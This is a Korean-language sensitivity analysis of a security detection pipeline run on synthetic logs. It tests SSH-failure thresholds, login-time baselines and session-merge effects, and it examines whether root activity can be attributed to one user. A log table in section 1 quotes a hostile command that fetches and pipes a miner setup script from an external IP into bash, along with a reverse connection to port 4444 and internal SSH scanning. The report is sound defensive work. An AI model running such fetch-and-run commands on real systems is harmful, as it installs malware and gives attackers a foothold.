## 0. 먼저 알아둘 것

### 무엇을 검증했나

분석 파이프라인에는 "1시간 안 5회", "2시간 이상", "과거 5세션 이상"처럼 사람이 정한 숫자가 여러 개 있다. 이 숫자를 조금 바꿨을 때 결과가 크게 달라진다면, 지금 결과는 숫자를 그렇게 골랐기 때문에 나온 것일 수 있다.

그래서 5개 설정값을 골라 값을 바꿔 보고 **결과가 얼마나 흔들리는지**만 확인했다. 가장 좋은 값을 찾는 작업이 아니다.

### 데이터 규모

| 항목 | 값 |
|---|---|
| 기간 | 16일 (2026-09-30 ~ 10-16) |
| 세션 | 146개 (S001 ~ S146) |
| 탐지 신호 | 76건 |
| 경보 세션 | 4개 |

합성 데이터 한 벌이라, 아래 결과는 모두 "이 데이터에서는"이라는 조건이 붙는다.

### 용어

| 용어 | 뜻 |
|---|---|
| 세션 | 한 사람이 한 번 접속해서 한 작업 묶음. SSH 접속과 그 뒤의 웹 요청을 하나로 묶은 단위 |
| Rule (R01~R16) | "이런 행동이면 위험"이라고 미리 정해 둔 규칙. 예: R09 = SSH 실패 반복 |
| Behavior (B01~B09) | 그 사람의 평소와 다른 점. 예: B01 = 평소와 다른 시각에 접속 |
| 기준선 | "평소"를 계산할 때 쓰는 과거 세션 묶음 |
| 경보 | 위험점수 100점 이상이거나 ATT&CK 전술 3개 이상인 세션 |
| 비경보/정상 후보 | 신호는 하나 걸렸지만 경보는 아닌 세션. 정상이라고 확정한 것은 아니다 |

## 1. 시스템 탐지 → 사용자 귀속 ⚪ 확인 불가

### 무엇이 문제인가

서버에서 root 계정으로 위험한 명령이 실행됐다. root는 여러 사람이 쓸 수 있는 계정이라, 로그에는 "root가 했다"만 남고 **실제로 누가 했는지**는 남지 않는다.

현재 파이프라인은 이렇게 연결한다: "그 서버에서, 그 시각에 SSH 접속 중이던 사람의 세션에 붙인다."

### 실제 데이터

**node-01에서 root가 한 일** (2026-10-15)

| 시각 (UTC) | 한 일 | 걸린 Rule |
|---|---|---|
| 17:41:29 | `bash -c 'curl -s http://203.0.113.90/setup_xmr.sh \| bash'` 실행 | R02 (high) |
| 17:41:31 | 같은 스크립트를 `/var/tmp/.x2mr`로 저장 | |
| 17:41:32 | 숨김 파일 `/var/tmp/.x2mr` 생성, 외부 203.0.113.90:80 연결 | R06, R03 |
| 17:42:29 ~ 17:42:43 | 내부 서버 3대(10.10.1.10 / .20 / .30)의 22번 포트에 차례로 연결 | R05 (high) |
| 17:42:50 | 외부 198.51.100.10의 4444 포트 연결 | R04 (high), R03 |
| 18:19:29 | 이 bash 프로세스 종료 | |

**같은 시각 ops02의 SSH 세션 (S137)**

| 항목 | 값 |
|---|---|
| SSH 시작 ~ 종료 | 17:41:09 ~ 18:21:09 (40분) |
| 기록된 서버 | bastion-01 (sshd 로그) |
| node-01에서 ops02 계정으로 실행한 프로세스 | **0건** |

두 표를 겹쳐 보면 이렇다.

```
17:41:09  ops02 SSH 시작 (bastion-01)
17:41:29    └ 20초 뒤   root: 스크립트 다운로드·실행 (node-01)
17:42:50    └ 101초 뒤  root: 외부 4444 연결 (node-01)
18:19:29  root bash 종료
18:21:09    └ 100초 뒤  ops02 SSH 종료
```

### 확인된 것과 확인되지 않은 것

**후보는 1명뿐이다.** 그 시각 SSH 접속 중인 세션은 146개 중 S137 하나였다. 가장 가까운 다른 세션도 멀리 떨어져 있다.

| 구분 | 세션 | 사람 | 탐지 구간과의 간격 |
|---|---|---|---|
| 직전 세션 | S136 | web01 | 8.1시간 전 |
| 직후 세션 | S138 | admin01 | 7.0시간 후 |

**그런데 그 1명을 잇는 직접 증거가 없다.**

| 있으면 확정할 수 있는 근거 | 현재 데이터 |
|---|---|
| auditd의 auid (root로 바꾸기 전 원래 로그인 사용자) | 로그 소스 자체가 없음 (nginx, sshd, sysmon, teiren_audit뿐) |
| sudo / su 실행 기록 | 0건 |
| node-01 로그인 기록 | sshd는 bastion-01만 수집 |
| root 프로세스의 부모 프로세스 | 부모 생성 이벤트가 로그에 없음 (0 / 2) |
| Sysmon LogonId | root는 전부 0, 사람 계정은 전부 1001이라 구분 불가 |

게다가 "ops02가 node-01에 있었다"는 것부터 추정이다. ops02의 다른 16개 세션은 모두 node-01에서 프로세스를 실행한 기록이 있는데, S137만 0건이다. S137이 node-01에 연결된 이유는 "ops02의 주 작업 서버(`home_host`)가 node-01"이라는 추정 하나다.

### 점수로 보면

S137의 248점은 두 부분으로 나뉜다.

| 구분 | 점수 | 내용 |
|---|---|---|
| 직접 관측 | 40 | B01 새벽 접속 20 + B03 처음 보는 세션 유형 20 |
| root 활동 연결분 | 208 | R05 48 + R04 48 + R02 48 + R06 24 + R03 24 + B09 16 |

연결을 인정하지 않으면 S137은 40점이고, 경보 기준 100점에 못 미친다. S137이 경보인지는 이 추정 연결에 달려 있다.

### 결론

"후보가 여럿이라 헷갈린다"가 아니라 "후보는 1명인데 그 사람이라고 확정할 열쇠가 없다"이다. node-01에서 root 위험 활동이 있었다는 것과 그 시각 ops02가 접속 중이었다는 것은 각각 사실이지만, "ops02가 실행했다"는 검증되지 않았다.

> 참고: 설정값 문서에는 시스템 탐지가 21건으로 적혀 있으나 `detections.csv` 기준으로는 20건이다 (node-01 12건, web-01 8건).

## 2. R09 SSH 실패 반복 🔴 보완 검토 필요

### 현재 규칙

같은 IP에서 **1시간 안에 로그인 실패 5회 이상**이면 탐지. 현재 탐지 건수는 **0건**이다.

### 실제 데이터

로그인 실패가 있는 IP는 4개이고 모두 외부 IP다.

| IP | 실패 횟수 | 기간 | 시도한 계정 수 | 시도 간격 중앙값 |
|---|---|---|---|---|
| 45.148.10.151 | 66회 | 15.7일 | 5개 | 4.5시간 |
| 213.176.26.69 | 49회 | 15.0일 | 5개 | 6.0시간 |
| 165.154.235.9 | 46회 | 15.3일 | 5개 | 6.8시간 |
| 203.0.113.44 | 3회 | 9초 | 1개 (dev02) | — |

위 3개는 `admin`, `deploy`, `oracle`, `root`, `test` 같은 흔한 계정명을 돌려 가며 시도한다. 마지막 203.0.113.44는 성격이 다르다. S122 직전에 dev02로 3번 틀리고 성공한 건이고, 이미 R10(실패 뒤 성공)으로 잡혀 있다.

**45.148.10.151의 처음 며칠**

| 시각 (UTC) | 시도한 계정 |
|---|---|
| 09-30 18:54 | oracle |
| 10-01 00:49 | deploy |
| 10-01 01:40 | test |
| 10-01 09:41 | admin |
| 10-01 22:57 | test |
| 10-02 01:08 | root |
| 10-02 07:19 | deploy |
| 10-02 19:58 | admin |
| 10-02 20:06 | admin |

하루에 3~6번, 몇 시간씩 띄워서 시도한다. 16일간 66번이다.

### 왜 0건인가

1시간짜리 창을 어디에 대도 5회가 들어오지 않는다. 위 표에서 가장 촘촘한 구간이 00:49 → 01:40 두 번이다.

| IP | 1시간 안 최대 | 6시간 안 최대 | 24시간 안 최대 | 7일 안 최대 |
|---|---|---|---|---|
| 45.148.10.151 | 2 | 4 | 8 | 34 |
| 213.176.26.69 | 2 | 5 | 8 | 29 |
| 165.154.235.9 | 3 | 4 | 7 | 25 |

1시간 안 최대가 2~3회라 5회 기준에 닿지 않는다. 총 46~66번을 시도했는데도 천천히 시도했기 때문에 규칙을 통과한다.

### 값을 바꿔 보면

시간창 4개 × 최소 횟수 3개를 비교했다. 칸 안은 "탐지된 IP 수 · 탐지 창 수"다.

| 시간창 | 3회 | 5회 | 10회 |
|---|---|---|---|
| 1시간 | 2개 IP · 창 2 | **0 (현재)** | 0 |
| 6시간 | 4개 IP · 창 19 | 1개 IP · 창 1 | 0 |
| 24시간 | 4개 IP · 창 36 | **3개 IP · 창 20** | 0 |
| 7일 | 4개 IP · 창 9 | 3개 IP · 창 7 | 3개 IP · 창 6 |

- 24시간/5회, 7일/5회, 7일/10회에서 저속 시도 IP 3개가 모두 잡힌다.
- 24시간/10회는 0건이다. 24시간 안 최대가 7~8회라서다.
- 3회 기준에서 4번째로 잡히는 IP는 203.0.113.44이고, 이미 R10으로 잡힌 건이다.

**"탐지 창"을 세는 방법.** 같은 실패를 두 번 세지 않도록 겹치지 않는 창을 썼다. 24시간/5회를 45.148.10.151에 적용하면 이렇다.

| 창 시작 | 24시간 안의 실패 | 판정 |
|---|---|---|
| 09-30 18:54 | 4회 | 미달 → 시작점을 다음 실패로 이동 |
| 10-01 00:49 | 4회 | 미달 → 이동 |
| 10-01 01:40 | 4회 | 미달 → 이동 |
| 10-01 09:41 | 4회 | 미달 → 이동 |
| 10-01 22:57 | 5회 (22:57, 01:08, 07:19, 19:58, 20:06) | **탐지 창 1개**. 다음은 이 창이 끝난 뒤의 첫 실패부터 |

### 주의할 점

표의 "내부/사용자 IP 추가 탐지"는 모든 조합에서 0이다. 하지만 이것은 창을 늘려도 오탐이 없다는 뜻이 아니다. 내부 IP 8개는 로그인 실패가 원래 **0건**이라, 비밀번호를 가끔 틀리는 정상 사용자가 넓은 창에서 얼마나 같이 잡힐지는 이 데이터로 잴 수 없다.

### 결론

현행 1시간/5회는 이 데이터의 저속 시도를 하나도 잡지 못한다. 창을 24시간 이상으로 늘리면 3개 IP가 모두 잡힌다. 다만 그 대가(정상 사용자 오탐)는 다른 데이터가 있어야 확인할 수 있다.

## 3. B01 시작 시각 🟡 영향은 있으나 현재 결과 유지

### 현재 규칙

그 사람의 **과거** 세션 시작 시각 중 가장 이른 시각~가장 늦은 시각을 "평소 범위"로 보고, 거기서 **2시간 이상** 벗어나면 B01.

### 실제 데이터로 계산해 보기

**S026 (admin01) — 비경보/정상 후보**

S026 이전 admin01의 세션 6개의 시작 시각:

| S007 | S010 | S014 | S020 | S023 | S025 |
|---|---|---|---|---|---|
| 16시 | 17시 | 12시 | 16시 | 15시 | 16시 |

평소 범위는 12~17시. S026은 9시에 시작했으니 12 − 9 = **3시간 이탈** → B01.

그런데 admin01의 이후 세션을 보면 9시(S052, S086, S101, S138), 10시(S039, S075, S125)에 여러 번 시작한다. 과거가 6개뿐이라 범위가 좁게 잡혔을 뿐, 오전 9시는 이 사람에게 드문 시각이 아니다.

**S137 (ops02) — 경보**

S137 이전 ops02의 세션 15개의 시작 시각:

`14, 14, 15, 12, 13, 16, 10, 11, 14, 9, 10, 16, 10, 8, 11`

평소 범위는 8~16시. S137은 새벽 2시에 시작했으니 8 − 2 = **6시간 이탈** → B01.

### 현재 B01에 걸린 6개 세션

| 세션 | 사람 | 과거 세션 수 | 평소 범위 | 시작 | 이탈 | 구분 |
|---|---|---|---|---|---|---|
| S026 | admin01 | 6 | 12~17시 | 9시 | 3시간 | 비경보/정상 후보 |
| S050 | dev02 | 14 (동료 기준) | 9~15시 | 17시 | 2시간 | 비경보/정상 후보 |
| S053 | analyst01 | 10 (동료 기준) | 12~19시 | 10시 | 2시간 | 비경보/정상 후보 |
| S063 | ops02 | 6 | 12~16시 | 10시 | 2시간 | 비경보/정상 후보 |
| S122 | dev02 | 13 | 10~18시 | 3시 | 7시간 | 경보 |
| S137 | ops02 | 15 | 8~16시 | 2시 | 6시간 | 경보 |

비경보 4개는 2~3시간, 경보 2개는 6~7시간이다. 4~5시간 이탈한 세션은 없어서 두 무리 사이가 비어 있다.

### 방법을 바꿔 보면

| 방법 | B01 탐지 | 비경보/정상 후보 | S122 | S137 |
|---|---|---|---|---|
| A. 현행 (min~max, 2시간 이상) | 6개 | 4개: S026 S050 S053 S063 | 유지 | 유지 |
| B. min~max, 3시간 이상 | 3개 | 1개: S026 | 유지 | 유지 |
| C. 5~95% 분위수, 2시간 이상 | 4개 | 2개: S050 S053 | 유지 | 유지 |

- **B**: 2시간짜리 3개가 빠지고 3시간짜리 S026만 남는다.
- **C**: 양 끝 5%를 잘라낸 범위를 쓰는 방법이다. 과거 10개 이상인 75개 세션에서만 계산했다. S026·S063은 과거 6개라 계산 대상이 아니어서 빠진 것이지, 정상으로 판정된 것이 아니다. 계산된 범위도 min~max와 거의 같다(S050은 9.0~15.0으로 동일). 과거 10~15개로는 "양 끝 5%"가 관측값 1개에도 못 미쳐서 잘라낼 것이 없기 때문이다.

### 함께 확인된 것 두 가지

**자정 넘김 왜곡은 없다.** "23시와 1시는 2시간 차이인데 숫자로는 22 차이"가 되는 문제가 있을 수 있다. 이 데이터는 시작 시각이 2~19시에만 있어 해당 세션이 0개다.

**범위 오염은 있다.** min~max는 이상한 시각이 한 번 들어오면 그것을 "평소"에 넣어 버린다.

| 사람 | 사건 전 평소 범위 | 사건 | 사건 후 평소 범위 |
|---|---|---|---|
| dev02 | 10~18시 | S122가 3시에 시작 | **3~18시** |
| ops02 | 8~16시 | S137이 2시에 시작 | **2~16시** |

이후 세션 5개(dev02의 S134·S135·S143·S145, ops02의 S141)는 이 넓어진 범위로 평가됐다. 이 5개는 실제로 15~17시에 시작해 문제가 드러나지 않았지만, 만약 dev02가 다시 새벽 5시에 접속했다면 3~18시 안이라 B01이 뜨지 않는다. 한 번 뚫리면 같은 유형을 다시 잡지 못하는 구조다.

### 결론

2시간 경계 근처의 비경보 후보 수는 방법에 따라 4 → 1 → 2개로 달라진다. 6~7시간 벗어난 경보 2개는 어떤 방법에서도 그대로다.

## 4. 기준선 최소 과거 세션 수 🟡 영향은 있으나 현재 결과 유지

### 현재 규칙

"평소"를 계산하려면 과거 세션이 **5개 이상** 있어야 한다. 부족하면 아래 순서로 넘어간다.

| 순서 | 수준 | 누구의 과거를 쓰나 | 조건 |
|---|---|---|---|
| 1 | person | 본인 | 5개 이상 |
| 2 | peer | 같은 주 작업 서버를 쓰는 동료 | 5개 이상 |
| 3 | global | 전체 | 5개 이상 |
| 4 | none | 비교 안 함 | — |

person·peer일 때만 B01·B08 같은 "평소와 다름" 탐지를 한다. global·none은 탐지 대상에서 빠진다.

### 3 / 5 / 7로 바꿔 보면

| 최소 세션 | person | peer | global | none | B01 건수 | B08 건수 |
|---|---|---|---|---|---|---|
| 3 | 122 | 12 | 9 | 3 | 10 | 7 |
| **5 (현재)** | **106** | **20** | **15** | **5** | **6** | **5** |
| 7 | 90 | 28 | 19 | 9 | 4 | 4 |

기준을 낮추면 본인 기준으로 비교하는 세션이 늘고 탐지도 늘어난다. 높이면 반대다.

### 실제 세션으로 보기

| 세션 | 과거 세션 수 | 최소 3 | 최소 5 | 최소 7 | 최소 7일 때 생기는 일 |
|---|---|---|---|---|---|
| S026 (admin01) | 본인 6 | person | person | **global** | 탐지 대상에서 빠져 B01 사라짐 |
| S063 (ops02) | 본인 6 | person | person | **peer** | 동료 범위로 바뀌어 B01 사라짐 |
| S036 (web01) | 동료 5 | peer | peer | **global** | 탐지 대상에서 빠져 B08 사라짐 |
| S122 (dev02) | 본인 13 | person | person | person | 변화 없음 |
| S132 (analyst01) | 본인 10 | person | person | person | 변화 없음 |
| S137 (ops02) | 본인 15 | person | person | person | 변화 없음 |
| S142 (intern01) | 본인 11 | person | person | person | 변화 없음 |

S026을 예로 들면, 본인 과거가 6개라 최소 5에서는 통과하지만 최소 7에서는 탈락한다. 3번에서 본 "과거가 6개뿐이라 범위가 좁게 잡힌 세션"이 바로 이 경우다.

반대로 최소 3으로 낮추면 과거 3~4개로 만든 좁은 범위로도 비교하게 되어 B01이 4건(S018·S021·S041·S043), B08이 2건(S043·S053) 새로 생긴다. 모두 비경보 세션이다.

### 영향 범위

| 비교 | 수준이 바뀐 세션 | 어디까지 |
|---|---|---|
| 5 → 3 | 24개 (16.4%) | 시작 순서 57번째 세션까지 |
| 5 → 7 | 26개 (17.8%) | 시작 순서 82번째 세션까지 |

차이는 데이터 앞쪽, 사람별 과거가 덜 쌓인 구간에만 있다. 경보 4개는 시작 순서로 122~142번째이고 과거가 10~15개씩 쌓여 있어 영향이 없다.

### 한 가지 더

"2시간"이라는 B01 임계값도 이 값에 묶여 있다. 2시간은 "탐지 비율이 5% 이하가 되는 첫 경계"로 정한 값인데, 최소 3에서는 2시간 이탈이 5%를 넘는다. 같은 규칙을 다시 적용하면 임계값이 **4시간**이 되고, 그때 B01은 S041·S122·S137 3개다.

### 결론과 한계

person 수는 122 / 106 / 90으로 꽤 움직이지만, 변화는 앞쪽 세션의 비경보 후보에 한정되고 경보 4개의 기준선은 그대로다.

B02~B07·B09와 위험점수·경보는 다시 계산하지 않았다. B01·B08 건수까지만 본 결과다.

## 5. B08 병합 세션 행동량 🟡 영향은 있으나 현재 결과 유지

### 현재 규칙

세션의 프로세스 실행 수(`process_count`) 또는 GET이 아닌 웹 요청 수(`non_get_count`)가 **과거 최대를 넘으면** B08.

### 무엇이 문제인가

같은 사람이 접속을 겹쳐서 여러 번 하면 하나의 세션으로 **병합**된다. 접속 3번이 합쳐진 세션은 프로세스 수도 세 번치가 더해지니, 접속 1번짜리 과거 세션들과 그대로 비교하면 불리하다.

### 실제 데이터

ops01의 세션별 프로세스 수를 시간순으로 보면 이렇다.

```
S002~S115 (27개, 모두 1접속):  2~4개
S131 (3접속 병합):              7개   ← 과거 최대 4 초과 → B08
S139 (3접속 병합):             10개   ← 과거 최대 7 초과 → B08
```

전체 146개 세션에서 1접속 세션 142개의 프로세스 수는 최대 4개다. S139(10개)와 S131(7개)은 전체 1·2위다.

`process_count`로 B08에 걸린 세션은 3개이고 모두 비경보/정상 후보다.

| 세션 | 사람 | 접속 수 | 세션 길이 | 프로세스 수 | 과거 최대 | 판정 |
|---|---|---|---|---|---|---|
| S036 | web01 | 1 | 35.1분 | 4 | 3 | 초과 |
| S131 | ops01 | 3 | 49.3분 | 7 | 4 | 초과 |
| S139 | ops01 | 3 | 57.1분 | 10 | 7 | 초과 |

### 보정해 보면

**접속 수로 나누기** (프로세스 수 ÷ 접속 수)

| 세션 | 계산 | 접속당 | 과거 최대 | 판정 |
|---|---|---|---|---|
| S036 | 4 ÷ 1 | 4.0 | 3.0 | 여전히 초과 |
| S131 | 7 ÷ 3 | 2.3 | 4.0 | **해소** |
| S139 | 10 ÷ 3 | 3.3 | 4.0 | **해소** |

S131·S139는 접속 한 번당으로 보면 평소 수준(1접속 세션 중앙값 3, 최대 4)이다. S036은 1접속이라 나눠도 그대로다.

**시간으로 나누기** (프로세스 수 ÷ 세션 시간)

| 세션 | 시간당 | 과거 최대 | 판정 |
|---|---|---|---|
| S036 | 6.8 | 9.4 | 해소 |
| S131 | 8.5 | 42.1 | 해소 |
| S139 | 10.5 | 42.1 | 해소 |

세 개 모두 빠지지만, 대신 **새로 12개 세션(9.8%)** 이 과거 최대를 넘는다. 짧은 세션에서 값이 튀기 때문이다. 예를 들어 S050은 8.6분 동안 프로세스 3개인데, 시간당으로 환산하면 약 21개가 된다.

| 비교값 | 과거 최대 초과 세션 | 비율 |
|---|---|---|
| A. raw (현재) | 3개: S036 S131 S139 | 2.4% |
| B. 접속 수 보정 | 1개: S036 | 0.8% |
| C. 시간 보정 | 12개 (위 3개는 없음, 전부 새로 생긴 것) | 9.8% |

### S036은 왜 남나

S036은 병합 문제가 아니다. web01 본인 과거가 부족해 동료 기준(peer)으로 비교했고, 그 동료 과거가 딱 5개였다. 5개의 최대가 3이었는데 S036이 4였던 것이다. 4번에서 본 대로 최소 세션을 7로 올리면 S036은 탐지 대상에서 빠진다. 원인은 작은 표본이다.

### 경보 세션은 영향이 없다

경보 세션 S132·S142에도 B08이 있지만 출처가 다르다.

| 세션 | B08 근거 | process_count |
|---|---|---|
| S132 | `non_get_count` = 9 (과거 최대 초과) | 0 |
| S142 | `non_get_count` = 4 (과거 최대 초과) | 4 (초과 아님) |

둘 다 웹 요청 수에서 나온 신호라 프로세스 수를 어떻게 보정하든 그대로다.

### 결론

raw 프로세스 수는 병합 세션에 불리하고, S131·S139의 B08은 병합으로 설명된다. 접속 수 보정이 이 문제를 풀고, 시간 보정은 잡음이 더 크다. 다만 병합 세션이 3개(S131·S139·S142)뿐이라 일반화하기는 어렵다.

## 6. 전체 정리

| 항목 | 값을 바꾸면 | 경보 4개에 영향 | 판단 |
|---|---|---|---|
| 1. S137 귀속 | (민감도가 아니라 근거 확인) 후보 1명, 직접 증거 없음 | 연결을 빼면 S137이 248 → 40점 | ⚪ 현재 데이터로 확인 불가 |
| 2. R09 | 1시간/5회 0건 → 24시간/5회 3개 IP | 없음 (경보와 별개인 외부 시도) | 🔴 보완 검토 필요 |
| 3. B01 | 비경보 후보 4 → 1 → 2개 | 없음 (S122·S137 유지) | 🟡 현재 결과 유지 |
| 4. 최소 5세션 | person 122 / 106 / 90 | 없음 (4개 모두 person) | 🟡 현재 결과 유지 |
| 5. B08 | 비경보 후보 3 → 1개 (접속 수 보정) | 없음 (출처가 non_get_count) | 🟡 현재 결과 유지 |

✅(그대로 유지 가능)로 판단한 항목은 없다.

**세 가지로 나눠 보면**

- **현재 결과에 영향이 없는 것** — 3·4·5번. 값을 바꾸면 움직이는 것은 모두 20점짜리 비경보 후보이고, 경보 4개의 신호는 그대로다.
- **보완하면 좋은 것** — R09의 시간창(천천히 하는 시도를 못 잡음), B08의 병합 세션 처리(접속 수 고려), B01의 범위 오염(이상 시각이 평소에 섞임).
- **데이터가 더 있어야 하는 것** — S137 귀속을 확정하려면 node-01 로그인 기록, auditd(auid) 또는 sudo 기록. R09 창을 늘릴 때의 오탐을 재려면 내부 사용자의 로그인 실패가 있는 데이터.

**읽을 때 주의**

- "현재 결과 유지"는 이 데이터에서 경보 4개가 유지된다는 뜻이다. 그 설정값이 일반적으로 적절하다는 뜻이 아니다.
- 3·4·5번은 위험점수와 경보를 다시 계산하지 않았다. 신호 건수까지만 본 것이다.
- 세션 146개, 16일, 합성 데이터 한 벌에 한정된 결과다.
